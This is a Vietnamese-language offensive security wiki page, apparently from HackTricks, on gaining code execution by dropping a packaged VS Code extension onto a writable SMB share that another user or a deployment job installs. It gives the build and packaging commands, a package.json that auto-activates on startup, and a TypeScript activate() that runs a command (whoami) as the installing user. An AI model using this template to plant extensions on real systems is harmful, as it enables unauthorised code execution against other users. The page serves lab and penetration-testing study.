# Thực thi qua share thả VS Code Extension

{{#include ../banners/hacktricks-training.md}}

VS Code extensions và Visual Studio VSSDK extensions đều sử dụng định dạng đóng gói `.vsix`, nhưng có manifest và runtime khác nhau. Một SMB drop share có quyền ghi chỉ trở thành đường dẫn thực thi **nếu** người dùng khác hoặc deployment job cài các package của nó vào VS Code. Khi đó, hàm `activate()` của extension chạy trong extension host với quyền của người dùng đó. Chỉ ghi một `.vsix` vào share thì không làm nó thực thi.<sup>[[1]](#references)[[2]](#references)</sup>

## Quy trình đóng gói và kích hoạt

Trước tiên, hãy xác nhận phiên bản VS Code của bên sử dụng và rằng share thực sự được đồng bộ hoặc cài đặt. Tạo một TypeScript extension và đặt hành động Node.js dự định thực hiện vào `activate()`. Sử dụng một activation event chạy mà không cần người dùng chọn lệnh, chẳng hạn như `onStartupFinished`, sau đó biên dịch và đóng gói extension. `engines.vscode` là **cổng kiểm soát tính tương thích runtime**; việc khớp `@types/vscode` với phiên bản API mục tiêu là biện pháp đảm bảo tương thích lúc build, không phải yêu cầu lúc cài đặt.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>

```bash
npx --package yo --package generator-code -- yo code
npm install --save-dev @types/vscode@^1.118.0
npm install -g @vscode/vsce
vsce package
code --install-extension ./example-0.0.1.vsix   # Test locally before delivery
```

Đối với trình soạn thảo đang chạy VS Code 1.118, các trường `package.json` liên quan là:<sup>[[1]](#references)[[2]](#references)</sup>

```json
{
  "activationEvents": ["onStartupFinished"],
  "engines": { "vscode": "^1.118.0" },
  "devDependencies": { "@types/vscode": "^1.118.0" }
}
```

Một kiểm tra `activate()` tối thiểu có thể thực thi lệnh và ghi nhật ký đầu ra từ extension host. Chỉ thay thế hành động kiểm thử sau khi xác minh gói đã được kích hoạt trong tài khoản/phiên dự kiến. Sự kiện `onStartupFinished` chạy sau khi khởi động, vì vậy đây không phải là bằng chứng thực thi cho đến khi trình soạn thảo thực sự khởi chạy và tiện ích mở rộng được cài đặt, bật.<sup>[[1]](#references)[[2]](#references)</sup>

```typescript
import { execFile } from 'node:child_process';
export function activate() {
  execFile('cmd.exe', ['/c', 'whoami'], (_err, stdout) => {
    console.log(stdout);
  });
}
export function deactivate() {}
```

Kẻ tấn công có quyền ghi vào drop share có thể tải lên package đã kiểm tra và chờ job sử dụng package đó. Trong ví dụ Checkpoint, quyền truy cập share của tài khoản được khôi phục cho phép ghi; tài khoản quyền thấp ban đầu chỉ có thể đọc share. Hãy phân biệt rõ hai điều kiện tiên quyết này. Với extension **Visual Studio**, hãy tham khảo chương [lạm dụng extension Visual Studio VSIX](visual-studio-vsix-extension-abuse.md) riêng thay vì quy trình VS Code này.<sup>[[1]](#references)</sup>

## References

- [1] [0xdf - HTB: Checkpoint](https://0xdf.gitlab.io/2026/10/24/htb-checkpoint.html)
- [2] [VS Code - Sự kiện kích hoạt](https://code.visualstudio.com/api/references/activation-events)
- [3] [VS Code - Xuất bản extension](https://code.visualstudio.com/api/working-with-extensions/publishing-extension)
